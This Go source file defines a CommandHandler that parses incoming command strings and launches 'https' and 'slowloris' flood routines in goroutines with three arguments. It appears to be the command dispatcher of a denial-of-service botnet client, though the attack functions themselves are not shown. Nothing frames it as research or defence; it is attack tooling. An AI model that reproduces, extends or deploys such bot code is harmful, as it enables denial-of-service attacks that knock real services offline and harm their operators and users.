package main

import (
	"strings"
)

func CommandHandler(command string) {
	commandd := strings.ReplaceAll(string(command), "\n", "")

	if strings.HasPrefix(commandd, "https") {

		args := strings.Split(commandd, " ")

		go HttpsDefault(args[1], args[2], args[3])
	}

	if strings.HasPrefix(commandd, "slowloris") {

		args := strings.Split(commandd, " ")

		go Slowloris(args[1], args[2], args[3])
	}
}
